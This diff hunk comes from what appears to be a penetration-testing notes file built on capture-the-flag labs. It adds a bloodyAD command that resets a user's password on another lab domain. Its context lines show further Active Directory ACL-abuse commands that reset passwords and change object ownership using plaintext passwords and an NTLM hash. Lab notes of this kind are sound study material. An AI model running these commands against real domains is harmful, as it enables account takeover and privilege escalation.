@@ -3326,6 +3326,8 @@ bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb 
 
 # change password sam  ( ANSIBLE_DEV$ need have ForceChangePassword permission ) 
 bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --host dc01.tombwatcher.htb set password "sam" "0xdf0xdf!"
+or
+bloodyAD -d sub.poseidon.yzx -u 'lisa' -p 'LisaWayToGo456' --host dc02.sub.poseidon.yzx --dc-ip 192.168.139.162 set password "JACKIE" "abc1234"
 
 # setting the owner of John to Sam  ( Sam need have WriteOwner permission )
 bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb set owner john sam
